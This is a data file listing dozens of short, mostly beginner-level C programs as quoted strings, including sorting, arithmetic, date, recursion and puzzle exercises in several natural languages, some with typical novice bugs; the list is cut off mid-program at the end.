    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int cont=1;\n    int numero;\n    int numeroM;\n    int numeroME;\n    while(cont <= 10)\n    {\n        printf(\"digite o %d numero:\",cont);\n        scanf(\"%d\",&numero);\n        cont = cont + 1;\n        if(cont ==1)\n        {\n            numeroME = numero;\n            numeroM = numero;\n    }\n        if((numero > numeroM))\n        {\n            numeroM = numero;\n        } else if(numero < numeroME)\n        {\n            numeroME = numero;\n        }\n    }\n    printf(\"\\no maior numero da sequencia e de : %d\",numeroM);\n    printf(\"\\no menor numero da sequencia e de : %d\",numeroME);\n    return 0;\n}",
    "int main(){\n int a, b ,c,d,e,f;\n a = 5;b = 10; c = 7; d = 8; e = 1;\n f = a - b + c + d - e;\n return f;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <time.h>\nint main(int argc, char** argv) {\n    srand(time(0));\n    for (int i = 0; i < 10; i++) {\n        fprintf((stdout), \"%d\\n\", rand() % 10);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint dana_u_mjesecu[13] = { 0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };\nchar *imena[] = { \"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\" };\nint main() {\n    int dd, mm;\n    int m;\n    scanf(\"%d%d\", &dd, &mm);\n    int dan = 2 + dd;\n    for(m = 1; m < mm; ++m) dan += dana_u_mjesecu[m];\n    printf(\"%s\\n\", imena[dan%7]);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nfloat F_Area(float raio);\nconst float PI=3.1415;\nint main()\n{\n    float r, y;\n    printf(\"Digite o valor do raio\\n\");\n        fflush((stdin));\n        scanf(\"%f\",&r);\n    y = F_Area(r);\n    printf(\"%.2f\\n\",y);\n    return 0;\n}\nfloat F_Area(float raio){\nfloat area;\narea=PI*raio*raio;\nreturn(area);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n    int i,n,*p,sum =0;\n    printf(\"Enter number of elements: \");\n    scanf(\"%d\",&n);\n    p = (int*)malloc(n*sizeof(int));\n    printf(\"\\n Enter the Numbers:\\n \");\n    for(i=1;i<=n;i++)\n    {\n        scanf(\"%d\",&p[i]);\n        sum = sum+p[i];\n    }\n    printf(\"\\nThe sum of the numbers = %d\",sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint main()\n{\n    const int interval = 10;\n    float farenheit, celcius;\n    farenheit = 1000;\n    printf(\"Farenheit\\t\\tCelcius\\n________________________________\\n\");\n    while(farenheit >= 0\n)\n    {\n        celcius = ((5 * ( farenheit - 32))/9);\n        printf(\"|\\t%.3f\\t|\\t%.2f\\t|\\n\",farenheit, celcius);\n        farenheit = farenheit - interval;\n    }\n    printf(\"|_______________________________|\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <string.h>\nvoid WriteToFile(char filePath[], char text[]);\nint main()\n{\n    WriteToFile(\"/home/xeroxcore/test\", \"hello world\\n\");\n    return 0;\n}\nint FilePathIsValid(char path[])\n{\n    int result = 0;\n    FILE *file = fopen(path, \"r\");\n    if (file)\n    {\n        fclose(file);\n        result = 1;\n    }\n    return result;\n}\nvoid WriteToFile(char filePath[], char text[])\n{\n    if (FilePathIsValid(filePath))\n    {\n        FILE *file = fopen(filePath, \"w\");\n        fprintf(file, text);\n        fputs(text, file);\n        fclose(file);\n    }\n    else\n    {\n        printf(\"Invalid filepath\\n\");\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, temp, grpChild[5]= {0};\n    scanf(\"%d\", &n);\n    while (n--)\n    {\n        scanf(\"%d\", &temp);\n        grpChild[temp] += 1;\n    }\n    int count = grpChild[4] + grpChild[3] + grpChild[2] / 2;\n    grpChild[1] -= grpChild[3];\n    if (grpChild[2] % 2 == 1)\n    {\n        count += 1;\n        grpChild[1] -= 2;\n    }\n    if (grpChild[1] > 0)\n    {\n        count += (grpChild[1] + 3) / 4;\n    }\n    printf(\"%d\\n\", count);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint cmp ( const void *a , const void *b )\n{ return *(int *)a - *(int *)b; }\nint main()\n{\n int a[1000000],b=1,i,n,max,k,s=0;\n scanf(\"%d\",&n);\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&a[i]);\n  }\n  qsort(a,n,sizeof(a[0]),cmp);\n scanf(\"%d\",&k);\n for(i=n-2;i>=0;i--)\n {\n  if(a[i]<a[i+1]) b++;\n  if(b==k) break;\n }\n if(b==k) printf(\"%d \",a[i]);\n max=a[i];\n for(i=0;i<n;i++)\n {\n  if(a[i]==max) s++;\n }\n printf(\"%d\",s);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint find(int);\nint main(void)\n{\n int n1=5,n2=7;\n printf(\"\u5b6b\u5b50\u554f\u984c\uff1a\u6709\u4e00\u5806\u6771\u897f\u4e0d\u77e5\u9053\u6709\u5e7e\u500b\uff0c\u4e09\u500b\u4e09\u500b\u6578\u5b83\u5269\u5169\u500b\uff1b\u4e94\u500b\u4e94\u500b\u6578\u5b83\u5269\u4e09\u500b\uff1b\u4e03\u500b\u4e03\u500b\u6578\u5b83\u5269\u5169\u500b\uff1b\u554f\u9019\u5806\u6771\u897f\u6709\u5e7e\u500b\u3002\\n\");\n printf(\"\u5b6b\u5b50\u554f\u984c\u7684\u7b2c%d\u500b\u6578\u662f%d\\n\",n1,find(n1));\n printf(\"\u5b6b\u5b50\u554f\u984c\u7684\u7b2c%d\u500b\u6578\u662f%d\\n\",n2,find(n2));\n system(\"pause\");\n return 0;\n}\nint find(int n)\n{\n int cont=0,i=1;\n while(cont!=n)\n {\n  if(i%3==2&&i%5==3&&i%7==2)\n   cont+=1;\n  i++;\n }\n return i-1;\n}",
    "#include <stdio.h>\nint main (){\nconst int size = 1000;\ndouble arr[size];\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint *foo() {\n    int i;\n    int array[5];\n    printf(\"%p\\n\", array);\n    for (i=0; i<5; i++) {\n        array[i] = 42;\n    }\n    return array;\n}\nvoid bar() {\n    int i;\n    int array[5];\n    printf(\"%p\\n\", array);\n    for (i=0; i<5; i++) {\n        array[i] = i;\n    }\n}\nint main()\n{\n    int i;\n    int *array = foo();\n    bar();\n    for (i=0; i<5; i++) {\n        printf(\"%d\\n\", array[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint main(void) {\n    int i;\n    uint8_t barcode = 0;\n    printf(\"Enter 8-bit barcode: \");\n    for (i=0; i<8; i++) {\n        int d;\n        scanf(\"%1d\", &d);\n        barcode <<= 1;\n        barcode |= d;\n    }\n    uint8_t shifted = barcode >> 1 | (barcode & (1 << 7));\n    uint8_t output = barcode ^ shifted;\n    uint8_t mask = 1 << 7;\n    uint8_t offset = 7;\n    printf(\"Output: \");\n    for (i=0; i<8; i++) {\n        printf(\"%d\", (output & mask) >> offset);\n        mask >>= 1;\n        offset--;\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\nint main() {\n  char buf[1024];\n  int fd = open(\"/dev/tekky_chrdev\", ((0x04000000) | (0x10000000)));\n  if (fd == -1) {\n    printf(\"open device failed!\\n\");\n    exit(1);\n  }\n  printf(\"current message in the device:\\n\");\n  read(fd, buf, 1024);\n  printf(\"%s\\n\", buf);\n  printf(\"input something: \");\n  scanf(\"%s\", buf);\n  write(fd, buf, strlen(buf));\n  printf(\"======after write=====\\n\");\n  read(fd, buf, 1024);\n  printf(\"%s\\n\", buf);\n  close(fd);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int array[100];\n    int i, j,k, num, temp,count,value;\n    scanf(\"%d\",&value);\n    for(k=0; k<value; k++)\n    {\n        count=0;\n        scanf(\"%d\", &num);\n        for (i = 0; i < num; i++)\n        {\n            scanf(\"%d\", &array[i]);\n        }\n        for (i = 0; i < num; i++)\n        {\n            for (j = 0; j < (num - i - 1); j++)\n            {\n                if (array[j] > array[j + 1])\n                {\n                    temp = array[j];\n                    array[j] = array[j + 1];\n                    array[j + 1] = temp;\n                    count=count+1;\n                }\n            }\n        }\n     printf(\"Optimal train swapping takes %d swaps.\\n\",count);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint power(int y,int x){\n    int pow=1,i;\n    for(i=1;i<=y;i++){\n        pow*=x;\n    }\n     return pow;\n    }\nint main()\n{\n   int a,b,pow;\n   printf(\"Enter the base:\");\n   scanf(\"%d\",&a);\n   printf(\"\\nEnter the power:\");\n   scanf(\"%d\",&b);\n   pow=power(b,a);\n   printf(\"a to power b : %d \",pow);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n  unsigned long long *l = malloc(sizeof(unsigned long long));\n  unsigned long long int i = 1;\n  while(i)\n  {\n    l = realloc(l, sizeof(unsigned long long) * i);\n     i *= 10;\n  }\n  return 0;\n}",
    "#include <stdio.h>\nvoid print_menu(void);\nvoid get_numbers(double *, double *);\ndouble add(double, double);\ndouble sub(double, double);\ndouble mul(double, double);\ndouble div(double, double);\nint main(void)\n{\n int select;\n double x, y;\n double r;\n printf(\"This program is a calculator\\n\");\n while (!0) {\n  print_menu();\n  printf(\"Select: \");\n  scanf(\"%d\", &select);\n  if (select >= 1 && select < 5) {\n   get_numbers(&x, &y);\n   if (select == 1) {\n    r = add(x, y);\n   } else if (select == 2) {\n    r = sub(x, y);\n   } else if (select == 3) {\n    r = mul(x, y);\n   } else if (select == 4) {\n    r = div(x, y);\n   }\n   printf(\"Result: %.3f\\n\", r);\n  } else {\n   break;\n  }\n }\n return 0;\n}\nvoid print_menu(void)\n{\n printf(\"\\nPlease select menu\\n\");\n printf(\"1. Add\\n\");\n printf(\"2. Sub\\n\");\n printf(\"3. Multiply\\n\");\n printf(\"4. Divide\\n\");\n printf(\"5. Exit\\n\");\n}\nvoid get_numbers(double *x, double *y)\n{\n printf(\"Enter the x: \");\n scanf(\"%lf\", x);\n printf(\"Enter the y: \");\n scanf(\"%lf\", y);\n}\ndouble add(double x, double y)\n{\n return x + y;\n}\ndouble sub(double x, double y)\n{\n return x - y;\n}\ndouble mul(double x, double y)\n{\n return x * y;\n}\ndouble div(double x, double y)\n{\n if (x == 0 || y == 0) {\n  return 0.0;\n } else {\n  return x / y;\n }\n}",
    "#include <stdio.h>\n int count(int a[],int n)\n {\n  int i,even=0,odd=0;\n    for(i=0; i<n; i++)\n    {\n          if(a[i]%2==0)\n          even++;\n          else\n          odd++;\n    }\n     printf(\"even numbers in array: %d\",even);\n     printf(\"\\n odd numbers in array: %d\",odd);\n }\nint main()\n{\n    int a[1000],i,n,sum;\n    printf(\"Enter size of the array : \");\n    scanf(\"%d\", &n);\n    printf(\"Enter elements in array : \");\n    for(i=0; i<n; i++)\n    {\n        scanf(\"%d\",&a[i]);\n    }\n    count(a,n);\n}",
    "#include<stdio.h>\n#include<math.h>\n#include<stdlib.h>\nint num(char s[], int n)\n{\n    if(n==0)\n        return 0;\n    else\n    {\n        char str[n-1];\n        for(int i=0;i<n-1;i++)\n        {\n            str[i] = s[i+1];\n        }\n        str[n-1] = '\\0';\n        int a = num(str,n-1) + ((int)s[0]-'0')*pow(10,n-1);\n        return a;\n    }\n}\nint main()\n{\n    int len=0, i=13;\n    char s[13], ch;\n    ch=getchar();\n    while(ch!='\\0' && ch!=(-1) && i>0)\n    {\n        i--;\n        s[len++] = ch;\n        ch = getchar();\n    }\n    if(i==0)\n    {\n        printf(\"No Valid IP exists\");\n        return 0;\n    }\n    s[len] = '\\0';\n    int a,b,c;\n    int count = 0;\n    for(a=1;a<=len-3;a++)\n    {\n        for(b=a+1;b<=len-2;b++)\n        {\n            for(c=b+1;c<=len-1;c++)\n            {\n                char *sb = (char *)malloc(a*sizeof(char));\n                char *s1 = (char *)malloc((b-a)*sizeof(char));\n                char *s2 = (char *)malloc((c-b)*sizeof(char));\n                char *s3 = (char *)malloc((len-c)*sizeof(char));\n                int pos = 0;\n                for(i = 0;i<a;i++)\n                {\n                    sb[pos++] = s[i];\n                }\n                pos = 0;\n                for(i = a;i<b;i++)\n                {\n                    s1[pos++] = s[i];\n                }\n                pos = 0;\n                for(i = b;i<c;i++)\n                {\n                    s2[pos++] = s[i];\n                }\n                pos = 0;\n                for(i = c;i<len;i++)\n                {\n                    s3[pos++] = s[i];\n                }\n                int nn = num(sb,a);\n                int n1 = num(s1,b-a);\n                int n2 = num(s2,c-b);\n                int n3 = num(s3,len-c);\n                if(s2[0]=='0' && c-b>1)\n                    continue;\n                if(s1[0]=='0' && b-a>1)\n                    continue;\n                if(s3[0]=='0' && len-c>1)\n                    continue;\n                if(sb[0]=='0' && a>1)\n                    continue;\n                if(nn>=0 && nn<=255 && n1>=0 && n1<=255 && n2>=0 && n2<=255 && n3>=0 && n3<=255)\n                {\n                    count++;\n                    printf(\"%d.%d.%d.%d\\n\",nn,n1,n2,n3);\n                }\n                free(sb);\n                free(s1);\n                free(s2);\n                free(s3);\n            }\n        }\n    }\n    if(count==0)\n        printf(\"No Valid IP exists\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <malloc.h>\nint main()\n{\n int secure_input[1], secure_input_counter, amount_of_coins;\n printf(\"Enter your amount of coins in pence to find out how many ways there are to collect this amount from English coins:\\n\");\n for (secure_input_counter = 0; secure_input_counter < 1; secure_input_counter++)\n {\n  char end_of_line = 0;\n  if (scanf(\"%d%c\", &secure_input[secure_input_counter], &end_of_line) != 2 || end_of_line != '\\n' || secure_input[secure_input_counter] < 1)\n\n  {\n   printf(\"Data you entered is incorrect.\\nPlease check it for correctness and re-enter.\\n\");\n   fseek((stdin), 0, (2));\n   secure_input_counter--;\n  }\n }\n amount_of_coins = secure_input[0];\n int types_of_coins_counter, array_counter;\n int types_of_coins[8] = {1, 2, 5, 10, 20, 50, 100, 200};\n int *array = (int*) malloc((1 + amount_of_coins) * sizeof(int));\n for (array_counter = 0; array_counter <= amount_of_coins; array_counter++)\n {\n  array[array_counter] = 0;\n }\n array[0] = 1;\n for (types_of_coins_counter = 0; types_of_coins_counter <= 7; types_of_coins_counter++)\n {\n  for (array_counter = types_of_coins[types_of_coins_counter]; array_counter <= amount_of_coins; array_counter++)\n  {\n   array[array_counter] = array[array_counter] + array[array_counter - types_of_coins[types_of_coins_counter]];\n  }\n }\n printf(\"Number of all possible combinations: %d.\", array[amount_of_coins]);\n free(array);\n return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n int i,j;\n int N = 4;\n int M = 5;\n int A[N][M];\n int B[N][M];\n for(i=0;i<N;i++) {\n  for(j=0;j<M;j++) {\n   A[i][j] = i*M+j;\n   B[i][j] = 9;\n  }\n }\n#pragma scop\n {\n#pragma species kernel A[2:N-1,1:M-1]|element -> B[2:N-1,1:M-1]|element\n  for (i = 2; i < N; i++) {\n   for (j = 1; j < M; j++) {\n    B[i][j] = A[i][j];\n   }\n  }\n#pragma species endkernel example10_k1\n }\n#pragma endscop\n fflush((stdout));\n return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    int number = 5;\n    float espresso = 13.5;\n    int cost = 3100;\n    printf(\"The %d CEOs drank %f cups of espresso.\\n\", number, espresso);\n    printf(\"The value of pi is %f.\\n\", 3.141593);\n    printf(\"Farewell! thou art too dear for my possessing,\\n\");\n    printf(\"%c%d\\n\", '$', 2 * cost);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\n\n\n\nvoid flops(int count)\n{\n   double a = 1.01;\n   int i;\n   for (i=0; i< count;i++) {\n     a = a * 1.1;\n     if (a > 10000)\n       a = 1.01;\n   }\n   printf(\"a=%f\\n\", a);\n}\n\n\n\n\n\n\nint main(int argc, char **argv)\n{\n\n\n\n   int flops1, flops2, flops3, flops4;\n   flops1 = 10000000 ;\n   flops2 = 40000000 ;\n   flops3 = 40000000 ;\n   flops4 = 20000000 ;\n   flops(flops1);\n   flops(flops2);\n   flops(flops3);\n\n   flops(flops4);\n   return 0;\n}",
    "#include <stdio.h>\nint bin(int arr[],int n,int t)\n{\n    int l=0;\n    int r=n-1;\n    while(l<=r)\n{\n     int m=l+(r-l)/2;\n    if(arr[m]<t)\n    l=m+1;\n    else if (arr[m]>t)\n    r=m-1;\n    else return m;\n    }\n    return -1;\n}\nint main()\n{\nint n;\nscanf(\"%d\",&n);\nint arr[n];\nfor(int i=0;i<n;i++)\n{\nscanf(\"%d\",&arr[i]);\n}\nprintf(\"%d\",bin(arr,7,7));\nreturn 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    double n, sqrt_5 = sqrt(5);\n    scanf(\"%lf\", &n);\n    n = (pow((1.0+sqrt_5)/2.0, n) - pow((1.0-sqrt_5)/2.0, n)) / sqrt_5;\n    printf(\"%.1lf\\n\", n);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\n\nint parity(int v);\nint main() {\n  int j;\n  int count = 0;\n  for (j = 1; j < 46; j = j + 5) {\n    if (parity(j) == 0) {\n       count = count + 1;\n    }\n  }\n  printf(\"%d\\n\", count);\n}\nint parity(int v) {\n  return v % 2;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n_Bool promising(int queen_index, int* columns){\n for(int i = 1; i < queen_index; ++i){\n  if(columns[queen_index] == columns[i]) return 0;\n  if((queen_index - i) == abs(columns[queen_index] - columns[i])) return 0;\n }\n return 1;\n}\nvoid n_queens_problem(int queen_index, int num_queens, int* columns){\n if(promising(queen_index, columns)){\n  if(queen_index == num_queens){\n   for(int i = 1; i <= num_queens; ++i){\n    printf(\"(%d, %d)\\n\", i, columns[i]);\n   }\n   printf(\"\\n\");\n  }\n  else {\n   for(int j = 1; j <= num_queens; ++j){\n    columns[queen_index + 1] = j;\n    n_queens_problem(queen_index + 1, num_queens, columns);\n   }\n  }\n }\n}\nvoid n_queens_problem_expand(int queen_index, int num_queens, int* columns){\n for(int i = 1; i <= num_queens; ++i){\n  columns[queen_index+1] = i;\n  if(promising(queen_index+1, columns)){\n   if(queen_index+1 == num_queens){\n    for(int i = 1; i <= num_queens; ++i){\n     printf(\"(%d, %d)\\n\", i, columns[i]);\n    }\n    printf(\"\\n\");\n   }\n   else{\n    n_queens_problem_expand(queen_index+1, num_queens, columns);\n   }\n  }\n }\n}\nint main(void) {\n int columns[5];\n printf(\"solution of original version\\n\");\n for(int i = 1; i <= 4; ++i){\n  columns[1] = i;\n  n_queens_problem(1, 4, columns);\n }\n printf(\"solution of expand version\\n\");\n for(int i = 1; i <= 4; ++i){\n  columns[1] = i;\n  n_queens_problem_expand(1,4,columns);\n }\n return 0;\n}",
    "#include <stdio.h>\n\nint main(){\n    int n,t;\n    while(scanf(\"%d%d\",&n,&t)!=(-1)){\n        int array[1001]={0},data,di,index=0;\n        for(int i=0;i<n;++i){\n            for(scanf(\"%d%d\",&data,&di);data>0;data-=di){\n                array[index]=data;\n                for(int x=index;x>0;--x){\n                    if(array[x]>array[x-1]){\n                        int temp=array[x];\n                        array[x]=array[x-1];\n                        array[x-1]=temp;\n                    }\n                    else break;\n                }\n                if(index<1000)++index;\n            }\n        }\n        data=0;\n        for(int i=0;i<t;++i){\n            data+=array[i];\n        }\n        printf(\"%d\\n\",data);\n    }\n}",
    "#include <stdio.h>\nvoid swaping(int *a, int *b)\n{\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}\nvoid bubble_sort(int arr[], int n)\n{\n    int i, j;\n    for (i = 0; i < n - 1; i++)\n    {\n        for (j = 0; j < n - i - 1; j++)\n        {\n            if (arr[j] > arr[j + 1])\n                swaping(&arr[j], &arr[j + 1]);\n        }\n    }\n}\nint main()\n{\n    int n, i;\n    printf(\"Enter the no of element:\");\n    scanf(\"%d\", &n);\n    int a[n];\n    printf(\"Enter the element of array:-\\n\");\n    for (i = 0; i < n; i++)\n        scanf(\"%d\", &a[i]);\n    bubble_sort(a, n);\n    printf(\"Sorted Array:\\n\");\n    for (i = 0; i < n; i++)\n        printf(\"%d \", a[i]);\n}",
    "#include<stdio.h>\nint main(int argc, char *argv[])\n{\n  int i = 0;\n  for(i = 0; i < argc; i++) {\n    printf(\"Cmd line arguments: %s\\n\", *(argv+i));\n  }\n  int ages[] = {10, 20, 30, 40, 5};\n  printf(\"The address of the ages array: %p\\n\", &ages);\n  printf(\"The address of index 0 inside of the ages array: %p\\n\", &ages[1]);\n  printf(\"The address of index 1 inside of the ages array: %p\\n\", &ages[1]);\n  char *names[] = {\n    \"Alan\", \"Frank\", \"Mary\", \"John\", \"Lisa\"\n  };\n  int count = sizeof(ages) / sizeof(int);\n  for(i = 0; i < count; i++) {\n    printf(\"%s is  %d years old. \\n\", *(names + i), *(ages + i));\n    printf(\"%s is  %d years old. \\n\", names[i], ages[i]);\n  }\n  printf(\"---\\n\");\n  int *cur_age = ages;\n  char **cur_name = names;\n  for(i = 0; i < count; i++) {\n    printf(\"%s is %d years old. \\n\", *(cur_name+i), *(cur_age+i));\n    printf(\"%s is %d years old. \\n\", cur_name[i], cur_age[i]);\n  }\n  printf(\"---\\n\");\n  for(i = 0; i < count; i++) {\n    printf(\"%s is %d years old again.\\n\", cur_name[i], cur_age[i]);\n    printf(\"%s is %d years old again.\\n\", *(cur_name+i), *(cur_age+i));\n  }\n  printf(\"---\\n\");\n  for(cur_name = names, cur_age = ages; (cur_age - ages) > count; cur_name++,cur_age++) {\n    printf(\"%s lived s also applies to full timers, just make a WORK: tag with your message.\" \" %d years so far. \\n\", *cur_name, *cur_age);\n\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint compare (const void * a, const void * b){\n  if ( *(int*)a < *(int*)b ) return -1;\n  if ( *(int*)a == *(int*)b ) return 0;\n  if ( *(int*)a > *(int*)b ) return 1;\n  return 0;\n}\nint *sorted(int a[]){\n int *r = a;\n qsort(r, sizeof(a[0]), sizeof(int), compare);\n return r;\n}\nint contains(int n, int a[]){\n for (int i = 0; i <= sizeof(a[0]); ++i){\n  if (a[i] == n){\n   return 1;\n  }\n }\n return 0;\n}\nint unique(int a[]){\n return 0;\n}\nint pos_and_neg(int a[]){\n return 0;\n}\nint encrypt(int s, int d){\n return 0;\n}\nint main(int argc, char const *argv[]){\n int rry[5] = {2,1,3,1,4};\n unique(rry);\n printf(\"%d\\n\", contains(5, rry));\n return 0;\n}",
    "#include <stdio.h>\n#include <stddef.h>\n#include <math.h>\nconst double probs[] = { 0.5, 0.8, 0.9, 0.95, 0.99 };\nconst int charcounts[] = { 2, 3, 4, 5, 6, 7, 8, 9, 10 };\nint main(int argc,char **argv)\n{\n printf(\"   |\");\n for (size_t i = 0; i < sizeof(probs)/sizeof(probs[0]); ++i) {\n  printf(\" %15d%% |\",(int)((probs[i]*100)+0.5));\n }\n printf(\"\\n\");\n printf(\"---+\");\n for (size_t i = 0; i < sizeof(probs)/sizeof(probs[0]); ++i) {\n  printf(\"------------------+\");\n }\n printf(\"\\n\");\n for (size_t i = 0; i < sizeof(charcounts)/sizeof(charcounts[0]); ++i) {\n  printf(\"%2d |\",charcounts[i]);\n  for (size_t j = 0; j < sizeof(probs)/sizeof(probs[0]); ++j) {\n   double t = log2(1 - probs[j]) / log2(1 - (1 / pow(32,charcounts[i])));\n   printf(\" %16.0f |\",t);\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\nint getMCD(int, int);\nint getMCM(int, int);\nint main() {\n int x, y;\n printf(\"Introduzca los dos numeros enteros a calcular su MCM y MCD: \");\n scanf(\"%d %d\", &x, &y);\n printf(\"El MCD es: %d\\n\", getMCD(x, y));\n printf(\"El MCM es: %d\\n\", getMCM(x, y));\n return 0;\n}\nint getMCD(int x, int y) {\n int c;\n do {\n  c = x % y;\n  if(c) {\n   x = y;\n   y = c;\n  }\n } while(c);\n return y;\n}\nint getMCM(int x, int y) {\n return x * y / getMCD(x, y);\n}",
    "#include<stdio.h>\nint main()\n{\n char s[] = \"\\033[47;46mhello world\";\n    printf(\"%s\", s);\nreturn 0;\n}",
    "#include<stdio.h>\n int main(){\n  int a, square, cube;\n  scanf(\"%d\",&a );\n  square = a * a;\n  cube = a * a * a;\n  printf(\"\\n%d\" ,square);\n  printf(\"\\n%d\\n\" ,cube);\n  return 0;\n }",
    "#include<stdio.h>\nint main()\n{\n printf(\"jhhi1\");\n return 0;\n}",
    "#include <stdio.h>\ntypedef unsigned long long ull;\null C(ull n,ull m)\n{\n    ull P = 1, Q = 1;\n    int i;\n    for (i = 1;i<=m;i++)\n    {\n        P *= (n - i + 1);\n        Q *= i;\n    }\n    return P / Q;\n}\nint main()\n{\n    ull m,n;\n    scanf(\"%llu%llu\",&m,&n);\n    printf(\"%llu\\n\",C(m,n));\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int d1, d2, d3;\n    scanf(\"%d %d %d\", &d1, &d2, &d3);\n    if((d1+d2)<d3) printf(\"%d\\n\", (d1+d2)*2);\n    else if((d1+d3)<d2) printf(\"%d\\n\", (d1+d2)*2);\n    else if((d2+d3)<d1) printf(\"%d\\n\", (d2+d3)*2);\n    else printf(\"%d\\n\", d1+d2+d3);\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n    const int SIZE = 8;\n    int intArray[SIZE];\n    printf(\"Input eight integers: \");\n    for (int i = 0; i < SIZE; i++) {\n        scanf(\"%d\", &intArray[i]);\n    }\n    printf(\"Print them in reverse order: \");\n    for (int i = SIZE - 1; i >= 0; i--) {\n        printf(\"%d \", intArray[i]);\n    }\n    return 0;\n}",
    "#include<string.h>\n#include<stdio.h>\nint main() {\n int arr[] = {1,2,3,4,5,6,7 };\n printf(\"%p\\n\", arr);\n printf(\"%p\\n\", &arr[0]);\n printf(\"%p\\n\", &arr);\n printf(\"%d\\n\", *arr);\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    double d;\n    int Base_money=100000;\n    float res=0.0;\n    int flag;\n    scanf(\"%lf\", &d);\n    flag = (int)(d/Base_money);\n    flag = flag>10 ? 10:flag;\n    switch (flag)\n    {\n    case 10:\n        res += (d-10*Base_money)*0.01;\n        d = 10*Base_money;\n    case 9:\n    case 8:\n    case 7:\n    case 6:\n        res += (d-6*Base_money)*0.015;\n        d = 6*Base_money;\n    case 5:\n    case 4:\n        res += (d-4*Base_money)*0.03;\n        d = 4*Base_money;\n    case 3:\n    case 2:\n        res += (d-2*Base_money)*0.05;\n        d = 2*Base_money;\n    case 1:\n        res += (d-1*Base_money)*0.075;\n        d = 1*Base_money;\n    case 0:\n        res += d*0.1;\n        break;\n    }\n    printf(\"%.2f \\n\", res);\n    return 0;\n}",
    "#include <stdio.h>\nint mygetline(char [],int );\nint main(){\n char a[10];\n int b;\n b=mygetline(a,10);\n printf(\"%d\\n\",b);\n return 0;\n}\nint mygetline(char s[],int lim)\n{ int i,c;\n i=0;\n while(--lim>0 && (c=getchar())!=(-1) && c!='\\n')\n  s[i++]=c;\n if(c=='\\n')\n  s[i++]='\\n';\n s[i]='\\0';\n return i;\n}",
    "#include <stdio.h>\nint main(){\n   int a, b;\n   printf(\"Enter the first value :\");\n   scanf(\"%d\", &a);\n   printf(\"\\n\");\n   printf(\"Enter the second value :\");\n   scanf(\"%d\", &b);\n   printf(\"\\n\");\n   if(a > b){\n       printf(\"%d is greater than %d\", a, b);\n   }\n   else if (a < b){\n       printf(\"%d is greater then %d\", b, a);\n   }\n   else\n   {\n       printf(\"Both are equal\");\n   }\n   return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n  int array[3];\n  array[0]=11;\n  array[1]=22;\n  array[2]=33;\n  int i,temp;\n  temp = array[1];\n  array[1] = array[2];\n  array[2] = temp;\n  for(i=0;i<3;i++)\n  {\n    printf(\"array[%d]=%d\\n\",i,array[i]);\n  }\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int prevSpl = 0, size, isGW = 0, alp[26] = {0};\n    scanf(\"%d\", &size);\n    char arr[101] = {0};\n    for (int i = 0; i < size; i++){\n        scanf(\"%s\", arr);\n        for (int k = 0; arr[k] != 0; k++){\n            if (prevSpl == arr[k]){ continue; }\n            prevSpl = arr[k];\n            if(alp[arr[k] - 97] == 1){ goto BPZERO; }\n            alp[arr[k] - 97] = 1;\n        }\n        isGW++;\n    BPZERO:\n    ;\n        prevSpl = 0;\n        for (int b = 0; b < 26; b++){ alp[b] = 0; }\n    }\n    printf(\"%d\", isGW);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nchar retornaLetra(){\n    return 'x';\n}\nint main()\n{\n    char letra;\n    letra = retornaLetra();\n    printf(\"%c\\n\", letra);\n    return 0;\n}",
    "#include<stdlib.h>\n#include<stdio.h>\nunsigned char* funcao(unsigned short*, unsigned short*, int);\nint recursive_square_compare_function(unsigned short, unsigned short*, int*, int);\nint recursive_nlogn_compare_function(unsigned short, unsigned short*, int, int);\nunsigned char *recursive_n_compare_function(unsigned short*, unsigned short*, unsigned char*, int, int, int, int);\nunsigned short *define_list(int);\nint main(int argc, char** argv){\n    int n;\n    scanf(\"%d\", &n);\n    srand(1);\n    unsigned short *v1 = define_list(n);\n    unsigned short *v2 = define_list(n);\n    unsigned char* found = funcao(v1, v2, n);\n    for(int i = 0; i < n; i++){\n        if(found[i] == 1) printf(\"%04hu \", v1[i]);\n    }\n    printf(\"\\n\");\n    free(v1);\n    free(v2);\n    free(found);\n    return 0;\n}\nunsigned short *define_list(int n_items){\n    unsigned short *v = (unsigned short*)malloc(n_items * sizeof(unsigned short));\n    v[0] = rand()%2;\n    for (int 